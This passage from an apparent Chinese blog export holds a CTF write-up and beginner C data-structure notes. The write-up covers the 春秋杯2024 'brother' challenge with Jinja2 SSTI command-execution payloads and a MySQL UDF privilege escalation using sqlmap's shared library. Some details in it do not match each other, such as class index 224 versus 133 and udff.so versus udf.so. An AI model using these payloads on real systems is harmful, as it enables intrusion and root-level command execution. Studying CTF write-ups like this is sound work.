<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;test&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;oldPassword&quot;</span><span class="punctuation">:</span><span class="string">&quot;test&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;newPassword&quot;</span><span class="punctuation">:</span><span class="string">&quot;123456&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E8%AE%AD4/image-20241025203915368.png"></p>
<h5 id="查询所有用户-queryAllUser"><a href="#查询所有用户-queryAllUser" class="headerlink" title="查询所有用户 &#x2F;queryAllUser"></a>查询所有用户 &#x2F;queryAllUser</h5><p><img src="/article/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E8%AE%AD4/image-20241025202501901.png"></p>
<hr>
<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>解决本地mysql和phpstudy的mysql冲突问题</p>
<ul>
<li><a href="https://blog.csdn.net/m0_73779708/article/details/142286199">https://blog.csdn.net/m0_73779708/article/details/142286199</a></li>
</ul>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
  </entry>
  <entry>
    <title>春秋杯2024-夏季赛</title>
    <url>/article/%E6%98%A5%E7%A7%8B%E6%9D%AF2024-%E5%A4%8F%E5%AD%A3%E8%B5%9B.html</url>
    <content><![CDATA[<p>记录一道SSTI模板注入+mysql udf提权</p>
<span id="more"></span>



<h1 id="brother"><a href="#brother" class="headerlink" title="brother"></a>brother</h1><p>打开题目给了个name参数</p>
<p>F12找到是python环境，尝试SSTI模板注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>用脚本找下<code>class &#39;os._wrap_close&#39;</code>位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import json</span><br><span class="line">classes=&quot;&quot;&quot;</span><br><span class="line">[&lt;class &#x27;_bz2.BZ2Decompressor&#x27;&gt;, &lt;class &#x27;coroutine_wrapper&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.json.JSONMixin&#x27;&gt;, &lt;class &#x27;posix.DirEntry&#x27;&gt;, &lt;class &#x27;urllib.request.Request&#x27;&gt;...  #将上一步得到的所有子类复制到这里</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">num=0</span><br><span class="line">alllist=[]</span><br><span class="line">result=&quot;&quot;</span><br><span class="line">for i in classes:</span><br><span class="line">    if i==&quot;&gt;&quot;:</span><br><span class="line">        result+=i</span><br><span class="line">        alllist.append(result)</span><br><span class="line">        result=&quot;&quot;</span><br><span class="line">    elif i==&quot;\n&quot; or i==&quot;,&quot;:</span><br><span class="line">        continue</span><br><span class="line">    else:</span><br><span class="line">        result+=i</span><br><span class="line">#寻找要找的类，并返回其索引</span><br><span class="line">for k,v in enumerate(alllist):</span><br><span class="line">    if &quot;class &#x27;os._wrap_close&quot; in v:</span><br><span class="line">        print(str(k)+&quot;---&gt;&quot;+v)</span><br></pre></td></tr></table></figure>

<p>得到位置为224，直接命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[133].__init__.__globals__.popen(&#x27;mysql -uctf -p&quot;123456&quot; -e &quot;show databases;&quot;&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E6%98%A5%E7%A7%8B%E6%9D%AF2024-%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706185106574.png"></p>
<p>读flag权限不够，尝试反弹shell也不行</p>
<p>读下源码文件</p>
<p><code>www.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect, render_template_string </span><br><span class="line">app = Flask(__name__) </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inedx</span>(): </span><br><span class="line">    name = request.args.get(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;&quot;</span>) </span><br><span class="line">    <span class="keyword">if</span> name == <span class="string">&quot;&quot;</span>: </span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/?name=hello&quot;</span>) </span><br><span class="line">    <span class="keyword">return</span> render_template_string(name) </span><br><span class="line">app.run(<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>

<p><code>api.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> mysql.connector, time, threading, socket</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mysql_keepalive</span>():</span><br><span class="line">    config = &#123;</span><br><span class="line">        <span class="string">&#x27;user&#x27;</span>: <span class="string">&#x27;ctf&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;host&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;database&#x27;</span>: <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;port&#x27;</span>: <span class="number">6666</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        db_connection = mysql.connector.connect(**config)</span><br><span class="line">        cursor = db_connection.cursor()</span><br><span class="line">    <span class="keyword">except</span> mysql.connector.Error <span class="keyword">as</span> err:</span><br><span class="line">        <span class="built_in">print</span>(err)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cursor.execute(<span class="string">&quot;SELECT VERSION();&quot;</span>)</span><br><span class="line">            cursor.fetchone()</span><br><span class="line">        <span class="keyword">except</span> mysql.connector.Error <span class="keyword">as</span> err:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;连接中断: <span class="subst">&#123;err&#125;</span>&quot;</span>)</span><br><span class="line">        time.sleep(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_client_connection</span>(<span class="params">client_socket</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            client_socket.send(<span class="string">&#x27;&#123;&quot;code&quot;:0, &quot;path&quot;: &quot;&quot;&#125;&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            time.sleep(<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error handling client: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_api</span>():</span><br><span class="line">    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    host = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">    port = <span class="number">7777</span></span><br><span class="line">    server_socket.bind((host, port))</span><br><span class="line">    server_socket.listen(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;update_api Listening on port <span class="subst">&#123;port&#125;</span>...&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        client_socket, addr = server_socket.accept()</span><br><span class="line">        handle_client_connection(client_socket)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/evil&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">evil</span>():</span><br><span class="line">        code = request.json[<span class="string">&#x27;code&#x27;</span>]</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key == <span class="built_in">open</span>(<span class="string">&quot;./evil.key&quot;</span>).read():</span><br><span class="line">            <span class="built_in">exec</span>(code)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;key error&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    threading.Thread(target=mysql_keepalive).start()</span><br><span class="line">    threading.Thread(target=update_api).start()</span><br><span class="line">    app.run(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p><code>update.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json </span><br><span class="line"><span class="keyword">import</span> socket </span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_specific_file</span>(<span class="params">tar_path, file_name, extract_path</span>): </span><br><span class="line">    <span class="keyword">with</span> tarfile.<span class="built_in">open</span>(tar_path, <span class="string">&quot;r:gz&quot;</span>) <span class="keyword">as</span> tar: </span><br><span class="line">        file_info = tar.getmember(file_name) </span><br><span class="line">        tar.extract(file_info, path=extract_path) </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ok&quot;</span>) </span><br><span class="line">s = socket.socket() </span><br><span class="line">s.connect((<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">7777</span>)) </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>: </span><br><span class="line">    data = s.recv(<span class="number">1024</span>) </span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        js = json.loads(data) </span><br><span class="line">        <span class="keyword">if</span> js[<span class="string">&#x27;code&#x27;</span>] == <span class="number">1</span>: </span><br><span class="line">            extract_specific_file(js[<span class="string">&#x27;path&#x27;</span>], <span class="string">&#x27;new.bin&#x27;</span>, <span class="string">&quot;/updatedir&quot;</span>) </span><br><span class="line">    <span class="keyword">except</span>: </span><br><span class="line">        s.send(<span class="string">b&#x27;Error&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>我们可以注意到<code>api.py</code>是进行数据库连接的，并且用户密码都知道</p>
<p>那么尝试连接数据库，使用-e参数命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[133].__init__.__globals__.popen(&#x27;mysql -uctf -p&quot;123456&quot; -e &quot;show databases;&quot;&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E6%98%A5%E7%A7%8B%E6%9D%AF2024-%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706185224072.png"></p>
<p>可以连接那么我们要利用数据库来提权</p>
<p>比较常见的UDF提权，当然这种提权方法是有前提的</p>
<p>我们先查看是否有限制目录读写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[133].__init__.__globals__.popen(&#x27;mysql -uctf -p&quot;123456&quot; -e &quot;show variables like \&#x27;%secure_file_priv%\&#x27;;&quot;&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E6%98%A5%E7%A7%8B%E6%9D%AF2024-%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706185553124.png"></p>
<p>可以看到<code>secure_file_priv</code>为空，说明不对读写进行限制</p>
<p>然后查看是否存在创建函数的目录<code>plugin</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[133].__init__.__globals__.popen(&#x27;mysql -uctf -p&quot;123456&quot; -e &quot;show variables like \&#x27;%plugin%\&#x27;;&quot;&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E6%98%A5%E7%A7%8B%E6%9D%AF2024-%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706185750870.png"></p>
<p>得到路径在 <code>/usr/lib/mysql/plugin/</code></p>
<p>上述这些条件都满足后才可以使用udf提权</p>
<p>我们要先上传so文件 <a href="https://www.sqlsec.com/2020/11/mysql.html#%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93">参考文章</a></p>
<p>按照国光师傅的思路利用sqlmap自带的动态链接库，进入cloak文件夹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/share/sqlmap/1.4.6/extra/cloak</span><br></pre></td></tr></table></figure>

<p>然后执行命令利用 sqlmap 自带的解码工具 cloak.py 来解码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 cloak.py -d -i ../../data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_64.so</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E6%98%A5%E7%A7%8B%E6%9D%AF2024-%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706214553260.png"></p>
<p>得到so文件后放到cyberchef转成十六进制</p>
<p><img src="/article/%E6%98%A5%E7%A7%8B%E6%9D%AF2024-%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706213717564.png"></p>
<p>执行写入命令，payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[133].__init__.__globals__.popen(&#x27;mysql -uctf -p&quot;123456&quot; -e &quot;SELECT  INTO DUMPFILE \&#x27;/usr/lib/mysql/plugin/udff.so\&#x27;;&quot;&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>写入文件后，创建自定义函数提权成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[133].__init__.__globals__.popen(&#x27;mysql -uctf -p&quot;123456&quot; -e &quot;CREATE FUNCTION sys_eval RETURNS STRING SONAME \&#x27;udf.so\&#x27;;&quot;&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>调用命令得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[133].__init__.__globals__.popen(&#x27;mysql -uctf -p&quot;123456&quot; -e &quot;select sys_eval(\&#x27;cat /flag\&#x27;);&quot;&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E6%98%A5%E7%A7%8B%E6%9D%AF2024-%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706201746687.png"></p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>提权</tag>
        <tag>模板注入</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构学习笔记</title>
    <url>/article/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
    <content><![CDATA[<p>记录有关数据结构的代码练习</p>
<span id="more"></span>

<h1 id="线性表"><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h1><h2 id="顺序表"><a href="#顺序表" class="headerlink" title="顺序表"></a>顺序表</h2><h3 id="表的定义"><a href="#表的定义" class="headerlink" title="表的定义"></a>表的定义</h3><h4 id="静态分配"><a href="#静态分配" class="headerlink" title="静态分配"></a>静态分配</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data[MaxSize];</span><br><span class="line">	<span class="type">int</span> length;</span><br><span class="line">&#125;SqList;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitList</span><span class="params">(SqList &amp;L)</span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;MaxSize; i++)&#123;</span><br><span class="line">		L.data[i]=<span class="number">0</span>;</span><br><span class="line">		L.length=<span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	SqList L;</span><br><span class="line">	InitList(L);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;MaxSize; i++)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;data[%d]=%d\n&quot;</span>,i,L.data[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行结果如下</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241013205426572.png" alt="image-20241013205426572"></p>
<h4 id="动态分配"><a href="#动态分配" class="headerlink" title="动态分配"></a>动态分配</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> InitSize 10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> *data;</span><br><span class="line">	<span class="type">int</span> MaxSize;   <span class="comment">//顺序表最大容量 </span></span><br><span class="line">	<span class="type">int</span> length;    <span class="comment">//顺序表当前长度 </span></span><br><span class="line">&#125;SeqList;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitList</span><span class="params">(SeqList &amp;L)</span>&#123;</span><br><span class="line">	<span class="comment">//用malloc函数申请一片连续存储空间</span></span><br><span class="line">	L.data=(<span class="type">int</span>*)<span class="built_in">malloc</span>(InitSize*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">	L.length=<span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> MaxSize=InitSize;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">IncreaseSize</span><span class="params">(SeqList &amp;L, <span class="type">int</span> len)</span>&#123;</span><br><span class="line">	<span class="type">int</span> *p=L.data;</span><br><span class="line">	L.data=(<span class="type">int</span>*)<span class="built_in">malloc</span>((L.length+len)*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;L.length; i++)&#123;</span><br><span class="line">		L.data[i]=p[i];         <span class="comment">//将原来的数据复制到新区域</span></span><br><span class="line">	&#125;</span><br><span class="line">	L.MaxSize=L.MaxSize+len;    <span class="comment">// 顺序表最大长度增加 len </span></span><br><span class="line">	<span class="built_in">free</span>(p);                    <span class="comment">//释放原来的内存空间 </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	SeqList L;</span><br><span class="line">	InitList(L);           <span class="comment">//初始化顺序表 </span></span><br><span class="line">	IncreaseSize(L, <span class="number">5</span>);    <span class="comment">//动态增加长度5 </span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="表的基本操作"><a href="#表的基本操作" class="headerlink" title="表的基本操作"></a>表的基本操作</h3><h4 id="插入元素"><a href="#插入元素" class="headerlink" title="插入元素"></a>插入元素</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data[MaxSize];              <span class="comment">//静态分配定义表</span></span><br><span class="line">	<span class="type">int</span> length;</span><br><span class="line">&#125;SqList;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitList</span><span class="params">(SqList &amp;L)</span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;MaxSize; i++)&#123;</span><br><span class="line">		L.data[i]=i;</span><br><span class="line">		L.length=<span class="number">7</span>;                 <span class="comment">//初始化长度为7</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ListInsert</span><span class="params">(SqList &amp;L, <span class="type">int</span> i, <span class="type">int</span> e)</span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> j=L.length; j&gt;=i; j--)&#123;</span><br><span class="line">		L.data[j]=L.data[j<span class="number">-1</span>];      <span class="comment">//使用后移方法，将前面的值往后移一位 </span></span><br><span class="line">	&#125;</span><br><span class="line">	L.data[i]=e;</span><br><span class="line">	L.length++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	SqList L;</span><br><span class="line">	InitList(L);</span><br><span class="line">	ListInsert(L, <span class="number">3</span>, <span class="number">3</span>);            <span class="comment">//往第三个位置插入元素3</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;L.length; i++)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;L.data[%d]=%d\n&quot;</span>, i, L.data[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行结果如下</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241013213806415.png" alt="image-20241013213806415"></p>
<h4 id="删除元素"><a href="#删除元素" class="headerlink" title="删除元素"></a>删除元素</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data[MaxSize];</span><br><span class="line">	<span class="type">int</span> length;</span><br><span class="line">&#125;SqList; </span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitList</span><span class="params">(SqList &amp;L)</span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;MaxSize; i++)&#123;</span><br><span class="line">		L.data[i]=i;</span><br><span class="line">		L.length=<span class="number">7</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ListDelete</span><span class="params">(SqList &amp;L,<span class="type">int</span> i)</span>&#123;</span><br><span class="line">	<span class="type">int</span> e=L.data[i<span class="number">-1</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> j=i; j&lt;=L.length; j++)&#123;</span><br><span class="line">		L.data[j<span class="number">-1</span>]=L.data[j];      <span class="comment">//使用前移法，将后面的值前移一位 </span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;L.data[%d]=%d is deleted\n&quot;</span>,i<span class="number">-1</span>,e);</span><br><span class="line">	L.length--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	SqList L;</span><br><span class="line">	InitList(L);</span><br><span class="line">	ListDelete(L, <span class="number">3</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;L.length; i++)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;L.data[%d]=%d\n&quot;</span>, i, L.data[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行结果如下</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241014000318515.png" alt="image-20241014000318515"></p>
<h4 id="按位查找"><a href="#按位查找" class="headerlink" title="按位查找"></a>按位查找</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data[MaxSize];</span><br><span class="line">	<span class="type">int</span> length;</span><br><span class="line">&#125;SqList;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitList</span><span class="params">(SqList &amp;L)</span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;MaxSize; i++)&#123;</span><br><span class="line">		L.data[i]=i;</span><br><span class="line">		L.length=<span class="number">7</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">GetElem</span><span class="params">(SqList L, <span class="type">int</span> i)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> L.data[i<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	SqList L;</span><br><span class="line">	InitList(L);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;MaxSize; i++)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;data[%d]=%d\n&quot;</span>,i,L.data[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> elem=GetElem(L, <span class="number">3</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;find the elem is %d&quot;</span>,elem);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行结果如下</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241014002345383.png" alt="image-20241014002345383"></p>
<h4 id="按值查找"><a href="#按值查找" class="headerlink" title="按值查找"></a>按值查找</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data[MaxSize];</span><br><span class="line">	<span class="type">int</span> length;</span><br><span class="line">&#125;SqList;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitList</span><span class="params">(SqList &amp;L)</span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;MaxSize; i++)&#123;</span><br><span class="line">		L.data[i]=i;</span><br><span class="line">		L.length=<span class="number">7</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">LocateElem</span><span class="params">(SqList L, <span class="type">int</span> e)</span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;L.length; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(L.data[i]==e)&#123;</span><br><span class="line">			<span class="keyword">return</span> i;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	SqList L;</span><br><span class="line">	InitList(L);</span><br><span class="line">	<span class="type">int</span> elem=LocateElem(L, <span class="number">4</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;find the elem in data[%d]&quot;</span>,elem);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行结果如下</p>
